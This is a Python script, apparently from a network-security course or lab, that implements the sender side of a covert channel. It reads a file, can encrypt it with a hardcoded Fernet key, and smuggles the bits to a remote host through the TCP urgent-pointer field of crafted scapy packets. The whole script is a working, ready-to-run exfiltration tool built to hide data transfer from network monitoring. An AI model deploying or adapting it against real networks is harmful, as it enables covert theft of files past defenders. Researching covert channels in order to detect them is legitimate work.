from scapy.all import *
import argparse
import os
import time
import random
from cryptography.fernet import Fernet

# Hardcoded symmetric key - must be the same in both sender and receiver
SYMMETRIC_KEY = b'dBbg_kQbMCvR3S1tzx6yTDJL3XaG6qyTjvBEx-0vvUY='

def encrypt_data(data):
    """Encrypt data using the hardcoded symmetric key"""
    f = Fernet(SYMMETRIC_KEY)
    return f.encrypt(data)


def tcp_sender(file_path, interval, bits_to_use=16, use_encryption=False):

    host = os.getenv('INSECURENET_HOST_IP')
    port = 8888
    
    if not host:
        print("Error: No target host specified in INSECURENET_HOST_IP environment variable.")
        print("Available environment variables:")
        for key, value in os.environ.items():
            if 'HOST' in key or 'NET' in key:
                print(f"  {key} = {value}")
        return
    
    if not os.path.exists(file_path):
        print(f"Error: File '{file_path}' not found.")
        print(f"Current working directory: {os.getcwd()}")
        print("Available files:")
        try:
            for f in os.listdir('.'):
                print(f"  {f}")
        except:
            pass
        return

    # Validate bits_to_use parameter
    if bits_to_use < 1 or bits_to_use > 16:
        print("Error: bits_to_use must be between 1 and 16")
        return
    
    max_value = (1 << bits_to_use) - 1
    bytes_per_chunk = max(1, bits_to_use // 8)
    print(f"Using {bits_to_use} bits of the urgent pointer field (max value: {max_value})")
    
    # Read file data
    with open(file_path, 'rb') as f:
        original_data = f.read()
    
    # Store original size for capacity calculation (always use 100 characters = 800 bits)
    original_size_bits = 800  # Always calculate based on 100-character file
    
    data = original_data
    # Encrypt data if requested
    if use_encryption:
        print("Encrypting data...")
        data = encrypt_data(data)
    
    # print(f"File size: {len(data)} bytes")
    
    # Prepare data chunks based on bits_to_use
    chunks = []
    mask = max_value
    
    # Special handling for bit counts that don't align with bytes
    bit_buffer = 0
    bit_count = 0
    
    # Process all bytes
    for byte in data:
        # Add this byte to the bit buffer
        bit_buffer = (bit_buffer << 8) | byte
        bit_count += 8
        
        # Extract chunks when we have enough bits
        while bit_count >= bits_to_use:
            bit_count -= bits_to_use
            value = (bit_buffer >> bit_count) & mask
            chunks.append(value)
    
    # Handle any remaining bits
    if bit_count > 0:
        # Pad with zeros
        value = (bit_buffer << (bits_to_use - bit_count)) & mask
        chunks.append(value)

    # Use random values for sport
    sport = random.randint(1024, 65535)
    
    # Add timing markers
    start_time = time.time()
    
    # Start with initial sequence numbers (no handshake needed)
    seq = random.randint(1000, 65535)
    ack = 0  # No ACK needed for one-way transmission
    
    ip = IP(dst=host)
    
    # Wait for receiver to be ready by sending SYN and waiting for response
    print("Checking if receiver is ready...")
    syn_packet = TCP(sport=sport, dport=port, flags="S", seq=seq)
    send(ip/syn_packet, verbose=0)
    
    # Simple wait to ensure receiver has time to start
    print("Waiting for receiver to be ready...")
    time.sleep(3)
    
    print(f"Starting transmission of {len(chunks)} chunks to {host}:{port}...")
    
    # Send data chunks directly
    for i, value in enumerate(chunks):
        tcp = TCP(sport=sport, dport=port, flags="A", seq=seq, urgptr=value)
        pkt = ip/tcp/"X"  # Dummy payload
        
        send(pkt, verbose=0)
        # print(f"Sent chunk {i+1}/{len(chunks)}: URG={value} (0x{value:04X})")
        
        # Increase sequence number for next packet
        seq += len(pkt[TCP].payload)
        
        # Wait between packets
        time.sleep(interval)
    
    # End timing marker
    end_time = time.time()
    transmission_time = end_time - start_time

    # Send special finish packet to signal transmission complete
    print("Sending finish signal packet...")
    finish_packet = TCP(sport=sport, dport=port, flags="PA", seq=seq, urgptr=0xDEAD)
    finish_payload = "COVERT_CHANNEL_FINISHED_TPP2024"
    send(ip/finish_packet/finish_payload, verbose=0)

    actual_transmitted_bits = len(data) * 8
    print(f"Successfully sent {len(original_data)} bytes ({len(data)} bytes after encryption) using TCP URG covert channel.")
    print(f"Transmission time: {transmission_time:.2f} seconds")
    print(f"Effective capacity (original file): {original_size_bits / transmission_time:.2f} bits/second")
    print(f"Actual throughput (transmitted data): {actual_transmitted_bits / transmission_time:.2f} bits/second")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Covert channel sender using TCP URG pointer")
    parser.add_argument('--file', required=True, help="Path to the file to send")
    parser.add_argument('--interval', type=float, default=0.2, help="Interval between packets in seconds")
    parser.add_argument('--bits', type=int, default=16, help="Number of bits to use in the urgent pointer (1-16)")
    parser.add_argument('--encrypt', action='store_true', help="Enable encryption of data")
    args = parser.parse_args()

    tcp_sender(args.file, args.interval, args.bits, args.encrypt)